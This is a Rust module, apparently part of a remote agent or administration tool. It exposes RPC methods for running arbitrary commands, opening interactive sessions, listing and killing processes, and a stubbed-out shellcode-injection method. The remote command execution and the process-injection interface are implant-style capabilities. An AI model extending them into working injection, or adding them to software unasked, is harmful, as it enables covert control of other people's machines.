pub mod execute;
mod interactive;
mod list;

use crate::{Error, Result as AppResult};
use rayon::prelude::{IntoParallelIterator, ParallelIterator as _};
use remoc::{
    rch::bin::{Receiver, Sender},
    rtc,
};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use sysinfo::{Pid, Process as ProcessInfo, ProcessRefreshKind, RefreshKind, System};

#[derive(Serialize, Deserialize, Debug)]
pub struct Process {
    pub name: String,
    cmd: Vec<String>,
    exe: Option<PathBuf>,
    pid: usize,
}

impl Process {
    fn from_process(pid: &Pid, process: &ProcessInfo) -> Self {
        Self {
            name: process.name().to_string_lossy().to_string(),
            cmd: process
                .cmd()
                .iter()
                .map(|c| c.to_string_lossy().to_string())
                .collect::<Vec<_>>(),
            exe: process.exe().map(|p| p.to_path_buf()),
            pid: pid.as_u32() as usize,
        }
    }
}

#[rtc::remote]
pub trait Agent: Sync {
    async fn execute(&self, command: String, args: Vec<String>) -> AppResult<execute::Output> {
        execute::execute(command, args).await
    }

    async fn execute_detached(&self, command: String, args: Vec<String>) -> AppResult<()> {
        execute::execute_detached(command, args)
    }

    async fn interactive(&self, command: String) -> AppResult<(Sender, Receiver, Receiver)> {
        interactive::interactive(command).await
    }

    async fn list(&self) -> AppResult<Vec<Process>> {
        Ok(list::list().await)
    }

    async fn kill_by_id(&self, pid: u32) -> AppResult<Vec<Process>> {
        Ok(kill_by(|p, _| p.as_u32() == pid)?)
    }

    async fn kill_by_name(&self, name: String) -> AppResult<Vec<Process>> {
        Ok(kill_by(|_, process| {
            process.name().to_string_lossy() == name
        })?)
    }

    async fn inject_shellcode_by_id(
        &self,
        _pid: u32,
        _shellcode: Vec<u8>,
        _ep_offset: u32,
        _parameter: Vec<u8>,
    ) -> AppResult<()> {
        Err(Error::Unsupported)
    }

    async fn get_id_by_name(&self, _name: String) -> AppResult<u32> {
        Err(Error::Unsupported)
    }
}

fn kill_by<F>(function: F) -> AppResult<Vec<Process>>
where
    F: Fn(&&Pid, &&ProcessInfo) -> bool + Sync + Send,
{
    let process = System::new_with_specifics(
        RefreshKind::nothing().with_processes(ProcessRefreshKind::everything()),
    );
    let processes = process
        .processes()
        .into_par_iter()
        .filter(|(pid, process)| function(pid, process))
        .map(|(pid, process)| {
            process.kill();
            Process::from_process(pid, process)
        })
        .collect();

    Ok(processes)
}
